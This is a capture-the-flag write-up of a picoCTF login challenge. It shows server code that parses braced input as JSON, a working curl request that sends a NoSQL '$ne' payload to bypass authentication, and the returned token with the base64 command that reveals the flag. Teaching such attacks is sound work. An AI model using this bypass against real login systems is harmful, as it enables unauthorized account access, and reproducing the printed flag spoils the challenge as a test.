
This is another writeup on how I exploited a log-in page on a picoCTF challenge. As the name, suggests, there is no SQL injection involved. The challenge came with 3 files to download. You can view how the log-in logic works by checking the javascript files.

**The Vulnerability**
If you look at the server.js file. There's this code:
email:
  email.startsWith("{") && email.endsWith("}")
    ? JSON.parse(email)
    : email,
password:  
	password.startsWith("{") && password.endsWith("}")  
	? JSON.parse(password)  
	: password,

Basically, what this means is that the if the inputs start with { and }, it will parse the inputs as JSON and into MongoDB commands we can exploit. We exploit this vulnerability using these curl commands:
```
curl -s -X POST [http://atlas.picoctf.net:56192/login](http://atlas.picoctf.net:56192/login) \
-H "Content-Type: application/json" \
-d '{"email": "{\"$ne\": null}", "password": "{\"$ne\": null}"}'
```

You can review the curl commands cheat sheet attached on one of my writeups.
You read further into No SQL injection here: https://portswigger.net/web-security/nosql-injection

**What we got:**
{"success":true,"email":"[picoplayer355@picoctf.org](mailto:picoplayer355@picoctf.org)","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzI1YmE0ZGUxfQ==","firstName":"pico","lastName":"player"}

This is a base-64 encoding which contains the CTF flag. We can use this shell command to decode the token:

```
echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzI1YmE0ZGUxfQ==" | base64 -d

```


![[Screenshot 2026-03-12 110120.png]]